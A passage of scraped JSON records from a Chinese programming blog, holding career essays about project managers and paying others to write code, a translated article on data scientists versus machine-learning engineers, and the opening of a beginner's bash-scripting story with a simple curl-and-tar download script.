Scrum会议上，Michael照例追踪分配给每个人的Task的完成情况，并分配新的Task。这种一成不变的例行汇报，听的多了，就有点习以为常了，左耳朵进，右耳朵出，当然，起码得“留一点痕迹”，至少得知道自己新的Task。在项目不是很复杂的时候，即使做不同样的事情，也大概知道彼此做事的内容。可是有一次，在同事小林汇报工作时，即使我集中十二分的注意力，也听不懂小林说话的内容，但是，Michael却能瞬间找到关键点，那一刻，我才知道什么叫“默契”，我能感受到小林的开心，因为有人很懂她。</p>\n<p>我请教过这个问题，Michael说：“这是由于‘信息不对称’导致的，因为我负责整个项目的进度和业务，跟所有的开发工程师（Developer）都有交集，交流比较多，知道他们在做什么，能听懂他们说的话，这很正常，不用诧异。”我觉得信息不对称，固然是一个重要的原因，但是，不是最主要的。我曾经在汇报工作时，对于数据库中出现的一个问题，提出了一个解决方案，由于这个想法是临时想出来的，我在描述解决方案时，没有组织好语言，说的磕磕绊绊，我认为我没有说清除，但是，Michael却出乎我意料之外的理解了，并把我的不成熟的想法完善了，当时，我意识到，有人懂我，是多么的开心，也理解了同事小林当时喜悦的心情。这是信息不对称，善于沟通所不能解释的，我认为，熟悉业务，善于思考，对项目经理来说，才是最重要的特质。</p>\n<h3>换位思考</h3>\n<p>还有一件事，由于同事小陈离职了，我开始接手PowerBI报表，在跟业务分析小组的同事共事时，我发现他们身上有一个显著的个性，就是：<strong>站在老板的立场上思考问题，组织语言和汇报工作。</strong>在我第一次无意识地向老板直接汇报工作时，我犯了很多技术出身的开发人员经常忽视的错误，那就是不自觉地在报告中掺杂了太多的开发术语，没有意识到，我面对的客户是一位不懂技术，但深谙业务的老板。沈姐是业务分析小组实际上的Leader，她跟我说：“你不能那样向老板回邮件，老板不懂技术，只懂业务，你要翻译成他们能够理解的内容，他们才知道，你已经把问题解决了，不然，他们又会发邮件问你。”</p>\n<p>有了沈姐的开导，我开始意识到，在工作上，必须具有换位思考的意识：站在老板的角度上来看待问题，但意识到，不代表你就能做到，这是一个技术活。当老板再次发送邮件，提出新的业务需求时，我又犯错了，这次的错误，是由于信息不对称导致的，也跟我缺少历练有关。老板在邮件中，说到：“请提供报表数据，用于分析组织者（Organizer）每个月在活动中的贡献（Contribution）。”由于在业务逻辑中，组织者（Organizer）是管理者角色的一种，除了Organizer，还有Co-Organizer，Event-Organizer，Assistant-Organizer等管理者角色，我提供的报表数据仅仅是Organizer角色每个月的贡献。Michael在Review代码时，认真对我说：“Vic，老板不知道我们具体的角色分类，老板想知道的，其实是所有组织者在每个月的贡献，要站在老板的角度上，处理问题。给老板的报表，每一个数据上的细节都必须做到有理有据，即使数据对不上，不align，也必须要有合理的解释。”这次教训非常深刻，我意识到，老板是特殊的存在，必须理解老板的意思，同时，也必须把自己的意思传达给老板，这中间需要由一个词汇的转换，怎样做到？站在老板的角度上，思考问题，处理问题，刚开始做的不好，不要紧，必须要有这个意识（Sense）和觉悟。</p>\n<h3>项目经理是整个项目组的大脑</h3>\n<p>这样说一点也不为过，至少在我们项目组是这样的，其他成员具备的是执行力，也就是按时完成任务的能力。这里抛出一个问题：给你一个团队，你要如何带？在两年多的时间里，Michael带领我们团队做过很多新的项目，而每个新的项目都不是凭空想出来的。之所以这么说，是因为，我也曾经有过相同的想法，但是，我没有意识到这个想法的价值，在脑海中思考过之后，没有把想法“变现”的意识，导致轻易把想法抛弃；一旦Michael提出类似的新项目之后，我发觉：“我曾经也有过这个想法，只不过，我没有继续深入下去，没有更进一步去丰富这个想法 ……”</p>\n<p>反省不能解决问题，或许，这才是项目经理应该具备的优秀性格：不是想不到，而是善于发现想法的价值。Michael把抽象的想法，变成文档上的设想，经过丰富之后，变成有价值的具体项目，这就是创建价值，简化业务的过程。Michael说：“我想实现的新项目，实际上就是为了优化业务流程，做到化繁为简，而为了实现这个目的，必须化简为繁。比如，为了便于发现更多有影响力的人物（Influencer），必须整合所有的数据资源，从各个数据源中分析数据，这是我们的主要业务需求，为了简化这个流程，可以把这套业务流程扩大化，自动化，做一个更为复杂的引擎来替代手工，一旦这个繁的引擎做出来，业务流程就会变的非常简单。”抓住主要业务搞优化，实现项目的增值和技术的迭代，这其实也是他的一种管理思想，极简工作：先解决主要矛盾，再解决次要矛盾，根据业务需求，调整优先级。</p>\n<h3>项目经理很忙的</h3>\n<p>实际上，我观察到Michael的工作，1/3是在开会。不仅跟开发者开会，而且跟老板开会。我们的老板是外国人，Michael的英语相当不错，上海人，软实力杠杠滴，从小到大接受的教育，是我们这些屌丝所不能想象的。跟老板开会的内容，大致是谈论业务需求，演示新的项目，Michael说：“老板是非常聪明的，非常熟悉业务，对于新的项目，老板只要看到demo，自然会想到如何使用，不需要过多的文字说明”，好吧，高级别的老板，我也没有接触过，能坐到那个位置上，肯定有过人之处。跟开发者开会，Michael主要是演示项目，把控项目的进度和分配任务。</p>\n<p>Michael在任务的管控上，没有绝对的收和放，而是：前期放任，定时检查，最后是测试和验收。不过，他的管理风格还是比较自由的，他说：“我分配一个任务交给你们来做，你们想怎么做，就怎么做，只要实现业务需求就行。我的任务不是告诉你们如何去做，而是，告诉你们怎么做最简单，哪些是当前的业务上能够满足的，哪些是当前不需要做的。”</p>\n<h3>项目经理很忙的</h3>\n<p>但是，Michael能够记住很多非常细节的业务逻辑，不得不佩服他得记忆力，是不是项目经理的记忆力都很好？Michael说：“首先，这些关键的业务逻辑是我设置的，我当然记得比较牢，其次，我能记住的，实际上是关键的业务逻辑，经常遇到，那些特殊的设置，我也是需要阅读代码才知道。”我觉得，跟普通的开发工程师不同，项目经理更擅长处理业务上的问题。身价一万和身价十万的差距，没有想象中那么大，通过努力，日积月累，我也能做项目经理。阿Q一下，梦想还是要有的，万一实现了。</p>\n<h3>关于加薪</h3>\n<p>这是一个非常具有挑战性的问题，除非你在项目组中是不可替代的，否则，你就只能拿着offer，或者跳槽来提升身价，但是，那些项目经理是如何从普通的开发工程师，一步步被提拔上去的呢？运营经理范老板给出一份答案：创造额外的价值，注意，是额外的价值，而不仅仅是本职工作。在公司的动员大会上，有一句很流行的话：要想成为项目经理，必须先干项目经理的活。当然这些话都出自高层之口，尽管，事实上，大多数Leader都是空降的，仍然会有人心灵淹死在鸡汤中。很多开发工程师，包括我，天真地认为，只要做好本职工作，提升技术实力，就能获得公司的认可和嘉奖，获得升职和加薪的机会，就像运营经理说的那样，“这是技术人员的一条路线，稳定而平缓，但是，如果想快速提升，走一条陡峭的上升路线，必须创造额外的价值，当你为公司创造额外价值的时候，公司也会给你提供更好的发展空间。”其实，道理都是相通的，打铁还需自身硬，公司不会给你机会试炼，而会给你空间发挥，前提是你必须比身边的人优秀，才有能力抓住机会。</p>\n<p>这一个个小故事，都是真实的，给我很多启发，在人生的道路上，能够聆听到成功者的教诲，是最难能可贵的，谢谢！</p>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111535\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111535votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111535\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/08/25e260d52cd3cc8e5ae1638dd3ab4271.jpg"], "fav_nums": 1, "comment_nums": 1, "create_date": "2017/06/21", "praise_nums": 1}
{"tags": " 2 评论 ,数据科学,开发,机器学习", "front_image_path": "full/49c6509b4b6997ea4dc3eadffba385b0196497cb.jpg", "title": "数据科学家和机器学习工程师有什么不同", "url_object_id": "94888647819d6f970f3339f019f4c5a9", "url": "http://blog.jobbole.com/108466/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://www.oreilly.com/ideas/what-are-machine-learning-engineers\">Ben Lorica、Mike Loukides</a>   译文出处：<a target=\"_blank\" href=\"http://www.iteye.com/news/32480\">ITEYE/何冰心</a>   </div><p>近十年来，“数据科学”和“数据科学家”备受关注。但对于哪些人可以被称为是“数据科学家”，则争论不休。业界最后达成一致：只要取得数据科学相关学位、认证的研究数据的，不论是在大学还是从在线课程，都称之为数据科学家。统计数据是枯燥单一的，是非自然的，只有各种各样的数据才使得世界丰富多彩。那么，如何去分析多样的数据呢？数据科学家便应需求而生。</p>\n<p>数据科学领域飞速发展，一大波数据专家正在袭来。在企业中，他们被称为“数据科学家”或“数据科学团队”，包括：</p>\n<ul>\n<li>普通员工：执行临时的分析或报告任务（包括商业智能和商业分析）</li>\n<li>数据分析者：负责统计分析，建模，包括实验和测试</li>\n<li>机器学习建模者：构建模型原型</li>\n</ul>\n<p>那么问题来了。创造出“数据科学家”此概念并且从数据中挖掘出产品的 DJ Patil 和 Jeff Hammerbacher 属于哪一类呢？他们看似并不属于以上任何一种。若非要归类，他们大概更倾向于被看做是机器学习的建模者。他们是研究者，并没有通过数据进行产出。那么，究竟如何定义数据科学家呢？我们认为，数据科学家不仅仅是统计学家，他们一般拥有计算机科学领域的博士学位，有着大量的数据实践经验，有着很强的编码能力，精通数据提取、清洗、建模、将原型变成产品、产品设计以及数据基础建设，等等。<strong>实际上，数据科学家更应该被称作为硅谷的“独角兽”，稀有且昂贵。</strong></p>\n<p><img id=\"pic\" class=\"\" src=\"http://wx3.sinaimg.cn/large/7cc829d3gy1fgkj97pnkuj20m00ejjtd.jpg\"></p>\n<p>“数据科学”不分领域不分专业，它不只是精算统计、商务智能、数据仓库等，它打破了已有行业的壁垒，比如软件、市场、管理、人力等。数据科学的灵魂所在是它涵盖了数据的方方面面，各个领域。而数据科学家的任务便是收集、使用所有数据，而不是某一领域的数据。</p>\n<p>然而，找到这些稀有的“独角兽”是极其困难的。因此，我们把其职能根据专业性进行划分，数据工程师便诞生了。数据工程师精通数学和统计学，但他们不只是数学家或统计学家，他们精通软件开发和编程，但又不只是程序员。数据工程师负责数据栈操作和维护，Hadoop 或 Spark 的构建和维护，以及众多数据库（比如 HBase 和 Cassandra）和平台（比如 Kafka、Spark Streaming 和 Apache Flink ）等等。他们要知道如何操作云端，如何使用 Amazon Web Services，Microsoft Azure 和 Google Compute Engine。</p>\n<p>2015 年有一篇被广泛引用的文献突出强调，真实世界的机器学习系统不只是分析模型。各个公司开始着眼于研发基于数据的产品，并把相关技术投入生产中去。在这众多项目中，严格属于“机器学习”的部分并不是很多。然后，我们发现越来越多的公司组成了机器学习工程师团队。这并不难想象，当今机器学习盛行，数据工程师肯定会顺应潮流寻求突破。那么，机器学习工程师与数据工程师有什么区别呢？</p>\n<p>一般来讲，机器学习工程师的职责涵盖软件工程师（和一些好的数据工程师）的职责：</p>\n<ul>\n<li>他们拥有比普通数据科学家更强的软件编码能力。</li>\n<li>由于他们的工作重心是产出数据产品，他们需要通观全局。</li>\n<li>他们监管数据型产品的生产，并了解产品可能会出现的问题。</li>\n<li>深度学习的盛行引领一个相关的更专业的职位出现：深度学习工程师。</li>\n</ul>\n<p>机器学习工程师不仅仅要了解，更要参与到软件架构和设计中去。比如，他们了解 A/B 测试，同时也要知道如何 A/B 测试。他们了解日志或安全性问题，同时也要知道如何让数据工程师能够有效使用日志数据。对于机器学习工程师这个头衔来说，并无新鲜和特殊之处，更多的是深挖而不是改变。</p>\n<p>机器学习与数据科学有什么区别呢？数据科学涵盖面更广。最大的区别是深度学习的运作方式。容易想象的是数据科学家如何挖掘数据，比如 Tukey 的 Exploratory Data Analysis 中介绍了挖掘并分析大量数据去发现其价值所在。</p>\n<p>但是深度学习改变了数据挖掘方式。我们不直接接触数据，我们只是知道结果，让程序自己去建模并发现数据的价值。比如，如何构建一个能够打败围棋冠军的智能机器人，如何准确地标记图片，如何精准地翻译。这些问题，需要大量的数据和维度，人力难以实现，而机器学习便是构造一个模型，让这个模型自主发掘数据。那么，数据科学家的工作便不再是自己从数据中发掘价值，而是构建一个能够分析数据并产生结果的机器。实现“平民化”是机器学习领域的梦想，其含义便是任意领域的专家都能构建一个机器学习系统，而非 AI 博士。比如，我们希望一个围棋选手便能够构建下一代 AlphaGo，一个西班牙语者便能够构建一个西班牙语翻译引擎，而非机器学习专家。</p>\n<p>这种转变影响着机器学习工程师。机器学习模型不是静态的，会随着需求变化而成长。应该有专人去监管机器学习系统并在必要时进行重新训练。</p>\n<p>所有从事软件或IT行业的人都知道安全问题很重要。如今，机器学习系统的安全性上还未出现问题，但依然要防范于未然。那么，如今的机器学习系统在哪方面容易被攻击？系统中的数据是否会被感染？是否能够强迫系统进行非必要的重训练？由于该系统的自主训练模式，我们需要重新认知其在安全性上的易攻击点。</p>\n<p>随着系统日益完善，我们发现更多的数据科学家使之转变为生产系统。比如，云端和 SaaS 使数据科学家得以充分利用数据模型并运用到生产中，一些开源项目像是 Clipper 和 Ground（加州大学伯克利分校的 RISELab 的新项目）也逐渐开始进行。但是我们依旧需要数据工程师和机器学习工程师：精通数据科学和机器学习，深入理解数据如何进行产出，敢于挑战创造基于机器学习的产品。他们是 “humans in the loop” 的终点。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"108466\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"108466votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"108466\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 2 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://wx3.sinaimg.cn/large/7cc829d3gy1fgkj97pnkuj20m00ejjtd.jpg"], "fav_nums": 2, "comment_nums": 2, "create_date": "2017/06/14", "praise_nums": 1}
{"tags": "程序员,职场, 7 评论 ", "front_image_path": "full/93c5357a5f9cfa4a19bfcde8644db2d5f7712cc6.jpg", "title": "我给你钱，你帮我改好不好？", "url_object_id": "44d75eb058214ff58a5b9fe0dccb16bd", "url": "http://blog.jobbole.com/108195/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"http://www.jianshu.com/p/4e4e41e1eecc\">乔兰伊雪</a>   </div><div>\n<h3>一、</h3>\n<p>七点左右，我下班回家的路上收到一条消息，是一个初入职场的同行发过来的。</p>\n<p><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/mw690/7cc829d3gy1fgjcurlsj2j20ka0d8t9t.jpg\" width=\"580\" height=\"378\"></p>\n<p>其实他也不算初入职场，去年他就毕业工作了，那个时候我在上家公司工作比较轻松，每天都会到论坛逛逛，时不时写一些小功能发到网上共享，也会帮别人解决一些问题。</p>\n<p>他看到了我的代码，就加了我，说是以后有问题就向我请教，后来就杳无音讯。直到前阵子联系我帮他写一个功能，我才知道他因为家里原因大半年没上班，最近才开始工作。</p>\n<p>他问我，有没有做过扫描二维码或者条形码的功能？</p>\n<p>我想了想，去年好像写过这个功能，就跟他说明天帮他找找这份代码。</p>\n<p>然后回家，吃了饭下楼散步，又收到他的消息。</p>\n<p>可是我现在就得实现这个功能啊？</p>\n<p><b>我有些无奈，你现在要实现这个功能，与我何干？这语气好像是你着急要这个功能，我就必须要帮你实现似的。</b></p>\n<p><b>小伙子，没有人有义务帮你做任何事情，何况还是素不相识的陌生人。</b></p>\n<p>谁让我这么心软呢，最后还是找到我去年写的那份代码的下载链接发给他，让他试试看能不能用。</p>\n<p>过了一会，他说，可以用，我从网上也下了一些demo，但是想把中间的正方形扫描框改成长方形的，却找来找去不知道怎么改。你有时间吗，我给你钱，你帮我改好不好？</p>\n<p>心里莫名升起一把火，代码都给你了，就是把正方形改成长方形都还要花钱让别人改，你是钱多得没处使么？</p>\n<p>我说我在外面，没法帮他改，我的代码注释都很清楚，让他自己找找改一下，又从网上找了一篇教程发给他，让他看着改。</p>\n<p>他的心情估计也很无奈，说，好吧，那我试试看。</p>\n<p>他找到了我设置扫描框的代码，截图给我看，却依然不知该怎么修改。</p>\n<p>我已经不知道该怎么跟他说了，只能跟他说你总得自己试着成长，不能一有问题就找别人帮你写。</p>\n<p>他说，好吧，我看看。</p>\n<p>第二天一早，我问他改好了么。他肯能在忙，直到下午才回复我说改好了，并对我表示感谢。</p>\n<p><b>这不就挺好么，不试一试又怎么知道自己不行呢？遇到事情不能过分的依赖别人，也不是所有的事情都可以用钱来解决，最好能自己解决的就自己解决，这样才能快速成长起来。</b></p>\n<h4>不是所有的路别人都可以帮你走 ，有些路是需要你独自前行的。</h4>\n<h3>二</h3>\n<p>我想，应该有很多这种初入职场的菜鸟，好不容易找到工作，自己却无法按时完成任务，而不得不四处求人帮忙，甚至花钱让别人帮他写以完成任务，保住饭碗。</p>\n<p>当然，刚入职时为了不耽误项目进度，这样做也不失为一种解决办法，但长期如此就是职业道德问题了，但愿这位小伙子能够靠自己能力胜任这份工作。</p>\n<p>我曾在某平台发过帖子咨询大家对于工作完不成，花钱买代码的行为的看法。</p>\n<p>有人表示不可思议，居然有人会这么做，也有一部分人表示自己身边就有这样的人，甚至自己就曾经被某大型软件公司一位工程师以低薪聘请，专职为那位工程师写代码，结果可想而知，被公司发现后，那位工程师被开除，他也失业了。</p>\n<p><b>想来这样长期靠买代码完成工作的人，大概下场都不会很好吧。</b><br>\n<img class=\"alignnone\" src=\"http://wx3.sinaimg.cn/mw690/7cc829d3gy1fgjcur1snfj20go09d3yo.jpg\" width=\"580\" height=\"326\"></p>\n</div>\n<p><b>我并不是想说菜鸟有多么笨，多么不可教，也不是想要讽刺谁，我只是希望他们能变得更好。</b></p>\n<p>毕竟我也是从菜鸟过来的，我懂得在工作中无法实现某个功能时，身边又没有大神可问的的那种焦急无奈的心情。但是万事开头难，遇到问题总得自己先试着去解决，去百度，去论坛贴吧看别人的经验帖。</p>\n<p>要知道你遇到的问题百分之九十九的程序员都曾遇到过，还有百分之一是天才，在写代码之前就能预见到各种可能出现的问题，然后规避错误。但绝大多数人都还是普通人，通过自己的努力实现某个功能，解决某个问题，并且愿意无偿将自己的经验和代码分享出来，避免大家重复造轮子。</p>\n<p>关键在于你是否能从偌大的信息库中找到跟你想要实现的功能相似的帖子和代码，并总结他人经验，转化成自己的能力，一步步提升自己，摆脱菜鸟的标签。</p>\n<p>但如果一遇到问题，甚至是很简单的问题就花钱让别人帮你写，你的工作是保住了，那么你的能力呢，又何时才能有提升？难不成就一直花钱让别人帮你写，自己实现一些简单的功能，那么你的职业生涯又能维持多久呢？</p>\n<p>我在上家公司曾招过一名实习生，因不服气学长通过培训编程找到一份高薪工作就到处吹牛，觉得自己不比他差，凭着不服输的劲儿自学成才。大部分功能他都能独立实现，甚至有些知识点比我们这些老程序员都了解的透彻，平常工作根本不需要别人指点，即便遇到问题也能自己查资料解决，或者一点就通。</p>\n<p>同样是初入职场的新人，为什么差距这么大呢？</p>\n<p>也许有人说，这跟天赋、能力有关，可是笨鸟先飞啊，你如果觉得自己天赋不太好，那就要付出比别人更多的努力去弥补先天不足。</p>\n<p>也许又有人说了，你怎么知道别人没有付出努力？对，我确实不能说他没付出努力，他也是天天加班，平常完不成的工作六日补回来，但用功不在点子上也是徒劳。而且他每次找我从来都不是问我某个功能怎么实现，原理是什么，而是直接问我实现这个功能要多少钱，你帮我写好，我给你钱。</p>\n<p><b>当然，从我的层面上来说，这对我来说没什么坏处，反而能得一份外快，我又何乐而不为呢？可我觉得，长此以往不是帮他，而是害了他</b>。</p>\n<blockquote><p>3</p></blockquote>\n<p><b>一份工作，如果你努力了，付出了，仍然感到费力，还不如换一份，要相信天生我材必有用，总会有适合你那一份。</b></p>\n<p>并不是所有的人都适合编程，有些人天生就爱编程，编程就像流淌在他身体里的血液，是他的生命，他的一切，这种人可遇不可求。</p>\n<p>而大部分人只是把编程当作职业，一份养家糊口的工作，其中也不乏因为职业而爱上编程，将自己的时间都贡献在开发大业上，成为万人敬仰的大神。</p>\n<p>我并不属于他们中的一员，也不是大神，走上编程之路也并非我的本意，只是迫于生计寻找一份高薪工作而已。</p>\n<p>我的工作和生活完全分开，力求在工作时间内完成任务，并有余力提升自己不至于被淘汰。下班之后不谈工作，甚至不摸电脑，事实上我一直都没买电脑。</p>\n<p>可能有人觉得一个程序员居然没有电脑很不可思议，那我可能是个奇葩。也许我是属于程序员中不求上进的那种，只求完成本职工作，不愿为编程贡献自己的业余时间，但起码我有能力完成我的工作。</p>\n<p>但有一部分人，当初可能是被忽悠，也可能是看上程序员的高薪，入了坑，学得很吃力也很用功，走上工作岗位后依然不能胜任，为了这个饭碗苦苦挣扎，把自己弄的心力交瘁。</p>\n<p>既然这么辛苦，为什么不换一份工作？</p>\n<p>肯定会有人说我站着说话不腰疼，换工作哪有那么容易，现在工作这么不好找。可是即便你那么努力的坚持下去，又能坚持多久？</p>\n<p>公司迟早会发现你的能力不适合这份工作，你还是要面临重新找工作风险，那么你之前的坚持又有何意义？何不趁早转行，也许你就能找到适合自己的工作，在你的岗位上发光发热。</p>\n<p>在写这篇文章的时候，朋友跟我说这篇文章发出去肯定会有很多人对号入座，触犯了很多人的利益，会有很多人骂我，但这是一种不良的社会现象，总得有人敢于直言，只有戳到了痛处，才会有反思。</p>\n<p>不光是程序员，各行各业都会有不适合该行业的人在生死边缘挣扎，我还是希望每个人都能对自己负责，反思自己是否适合从事某份工作，如果不适合一定要及时悬崖勒马，换一个方向也许就海阔天空。</p>\n<h4>人生苦短，何必在没有希望的路上浪费精力？</h4>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"108195\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"108195votetotal\">5</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"108195\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 5 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 7 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://wx4.sinaimg.cn/mw690/7cc829d3gy1fgjcurlsj2j20ka0d8t9t.jpg"], "fav_nums": 5, "comment_nums": 7, "create_date": "2017/06/13", "praise_nums": 5}
{"tags": " 1 评论 ,Bash,IT技术", "front_image_path": "full/d1b17b98748a74826464a08e6d30a4ee1b15b171.jpg", "title": "我是如何开始踏上 bash 脚本编程之路的？", "url_object_id": "f65b12bcb444cfbc3d0109311fbdd75c", "url": "http://blog.jobbole.com/111509/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://opensource.com/article/17/5/how-i-learned-bash-scripting\">Sandra Mccann</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-8617-1.html\">Linux中国/xllc</a>   </div><p>我前几天写了一个脚本。对于一些人来说，这句话听起来没什么了不起的。而对于另一些人来说，这句话意义重大。要知道，我不是一个程序员，而是一个作家。</p>\n<h3 id=\"toc_1\">我需要解决什么？</h3>\n<p>我的问题相当简单：我需要将工程文件进行分类。这些文件可以从一个网站 URL 以 .zip 的格式下载。当我正手工将它们拷贝到我的电脑桌面，并移动到一个已按照我文件分类的需要进行了结构化的目录时，一位作家同事给我提了建议：<em>“不就是写个脚本的事吗？”</em></p>\n<p>我心想：<em>“就写个脚本？”</em>——说得好像这是世界上最容易做的事情一样。</p>\n<h3 id=\"toc_2\">Google 是如何解救我的？</h3>\n<p>同事的问题促使我思考，并且经过思考后，我进行了 Google 搜索。</p>\n<p><strong>Linux 上使用的是什么脚本编程语言？</strong></p>\n<p>这是我第一个 Google 搜索的准则。也许很多人心里会想：“她太笨了！”是的，我很笨。不过，这的确使我走上了一条解决问题的道路。最常见的搜索结果是 Bash 。嗯，我听说过 Bash 。呃，我要分类的文件中有一个里面就有 Bash，那无处不在的 <code>#!/bin/bash</code> 。我重新看了下那个文件，我知道它的用途，因为我需要将它分类。</p>\n<p>这引导我进行了下一个 Google 搜索。</p>\n<p><strong>如何从一个 URL 下载 zip 文件？</strong></p>\n<p>那确实是我的基本任务。我有一个带有 .zip 文件的 URL ，它包含有所有我需要分类的文件，所以我寻求万能的 Google 的帮助。搜索到的精华内容和其它一些结果引导我使用 Curl 。但最重要的是：我不仅找到了 Curl ，其中一条置顶的搜索结果还展示了一个使用 Curl 去下载并解压 .zip 文件的 Bash 脚本。这超出了我本来想寻求的答案，但那也使我意识到在 Google 搜索具体的请求可以得到我写这个脚本需要的信息。所以，在这个收获的推动下，我写了最简单的脚本：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bce6aed82d689884426\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n#!/bin/sh\r\ncurl http://rather.long.url | tar -xz -C my_directory --strip-components=1</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bce6aed82d689884426-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bce6aed82d689884426-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; 